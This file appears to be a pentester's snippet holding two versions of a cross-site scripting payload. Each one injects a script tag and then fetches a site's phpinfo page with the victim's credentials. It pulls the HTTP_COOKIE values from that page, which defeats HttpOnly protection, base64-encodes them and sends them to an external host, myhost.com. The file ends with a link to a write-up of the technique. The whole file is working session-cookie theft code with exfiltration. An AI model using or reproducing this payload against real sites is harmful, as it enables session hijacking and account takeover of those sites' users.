# "><script src="//host.com/httponlybypass.js"></script>

var req = new XMLHttpRequest();
req.onload = reqListener;
var url = '{{url}}/info.php';
req.withCredentials = true;
req.open('GET', url, false);
req.send();

function reqListener(){
var req2 = new XMLHttpRequest();
const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 );
const sess2 = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE_SECOND') + 1 );
req2.open('GET', 'https://myhost.com/config.php?data=' + btoa(sess) + '&data2=' + btoa(sess2), false);
req2.send()
};

---
# "><script src="//host.com/httponlybypass.js"></script>
var req = new XMLHttpRequest();
req.onload = reqListener;
var url = '{{url}}/info.php';
req.withCredentials = true;
req.open('GET', url, false);
req.send();

function reqListener(){
var req2 = new XMLHttpRequest();
const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 );
req2.open('GET', 'https://myhost.com/config.php?data=' + btoa(sess), false);
req2.send()
};

# https://aleksikistauri.medium.com/bypassing-httponly-with-phpinfo-file-4e5a8b17129b
